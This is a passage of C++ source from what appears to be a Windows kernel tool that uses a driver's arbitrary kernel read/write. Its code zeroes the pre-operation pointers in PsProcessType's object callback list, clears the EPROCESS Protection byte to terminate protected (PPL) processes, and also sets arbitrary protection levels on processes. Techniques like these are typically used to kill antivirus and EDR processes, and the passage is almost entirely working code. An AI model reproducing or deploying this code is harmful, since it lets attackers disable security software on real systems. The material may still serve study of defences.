        // Offsets mirror cmd_obcb.cpp: OBJ_TYPE.CallbackList=+0xC8, OBE_PREOPERATION=+0x28, OBE_ENABLED=+0x14
        DWORD64 psProcessTypePtr = KUtil::KernelExport("PsProcessType");
        if (!psProcessTypePtr) {
            printf("%s[!]%s Could not resolve PsProcessType.\n", A_RED, A_RESET);
            return;
        }
        DWORD64 objType  = g_drv->Rd64(psProcessTypePtr);
        DWORD64 listHead = objType + 0x0C8;
        DWORD64 cur      = g_drv->Rd64(listHead);

        // Collect and zero PreOp pointers
        struct SavedCb { DWORD64 preOpAddr; DWORD64 preOpVal; };
        std::vector<SavedCb> saved;
        for (int guard = 0; g_drv->IsKernelVA(cur) && cur != listHead && guard < 64; guard++) {
            DWORD64 preOpAddr = cur + 0x028;
            DWORD64 preOpVal  = g_drv->Rd64(preOpAddr);
            if (preOpVal) {
                saved.push_back({preOpAddr, preOpVal});
                g_drv->Wr64(preOpAddr, 0);
                printf("  [*] Zeroed PreOp @ %p (was %p)\n", (void*)preOpAddr, (void*)preOpVal);
            }
            cur = g_drv->Rd64(cur); // Flink
        }

        Sleep(10);
        hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProc) {
            if (TerminateProcess(hProc, 0)) {
                printf("%s[+]%s PID=%lu killed (ObCb bypass).\n", A_GREEN, A_RESET, pid);
                CloseHandle(hProc);
                for (auto& cb : saved) g_drv->Wr64(cb.preOpAddr, cb.preOpVal);
                return;
            }
            CloseHandle(hProc);
        }
        DWORD lastErr = GetLastError();
        for (auto& cb : saved) g_drv->Wr64(cb.preOpAddr, cb.preOpVal);
        printf("%s[!]%s Still failed (err %lu) after ObCb bypass — process may be protected by other means.\n",
               A_RED, A_RESET, lastErr);
        return;
    }

    // Zero the protection byte
    g_drv->Wr8(eproc + KUtil::EP_Protection, 0);
    printf("%s[+]%s Protection cleared (0x%02X -> 0x00).\n", A_GREEN, A_RESET, oldProt);
    Sleep(50);

    hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc) {
        if (TerminateProcess(hProc, 0)) {
            printf("%s[+]%s PID=%lu killed successfully.\n", A_GREEN, A_RESET, pid);
            CloseHandle(hProc); return;
        }
        CloseHandle(hProc);
    }

    // Failed — restore protection byte to leave the process in a consistent state
    printf("%s[!]%s TerminateProcess still failed (err %lu) — restoring Protection byte.\n",
           A_RED, A_RESET, GetLastError());
    g_drv->Wr8(eproc + KUtil::EP_Protection, oldProt);
}

// /make-ppl <pid> [level]
// Sets EPROCESS.Protection to turn any process into a PPL for testing purposes.
// level: Protection byte value to write (default 0x61 = PPL / Signer=Windows)
//   0x21 = PPL WinTcb    0x41 = PPL Antimalware    0x61 = PPL Windows
//   0x72 = PP  WinTcb    0x22 = PP  WinTcb (full protected)
// Use /kill-ppl to undo.
void CmdMakePpl(DWORD pid, BYTE level) {
    if (!level) level = 0x61; // default: PPL / Signer=Windows

    DWORD64 eproc = KUtil::FindEPROCESS(pid);
    if (!eproc) {
        printf("%s[!]%s Could not find EPROCESS for PID=%lu.\n", A_RED, A_RESET, pid);
        return;
    }

    BYTE cur = g_drv->Rd8(eproc + KUtil::EP_Protection);
    g_drv->Wr8(eproc + KUtil::EP_Protection, level);
    BYTE verify = g_drv->Rd8(eproc + KUtil::EP_Protection);

    printf("%s[+]%s PID=%lu EPROCESS=0x%llX  Protection: 0x%02X -> 0x%02X (%s)\n",
           A_GREEN, A_RESET, pid, eproc, cur, verify,
           KUtil::ProtectionStr(verify));

    // Confirm TerminateProcess is now blocked
    HANDLE hTest = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hTest) {
        printf("%s[+]%s OpenProcess(PROCESS_TERMINATE) denied (err %lu) — PPL is active.\n",
               A_GREEN, A_RESET, GetLastError());
    } else {
        printf("%s[!]%s OpenProcess still succeeded — protection may not have taken effect yet.\n",
               A_YELLOW, A_RESET);
        CloseHandle(hTest);
    }
    printf("  Use /kill-ppl %lu to kill it.\n", pid);
}
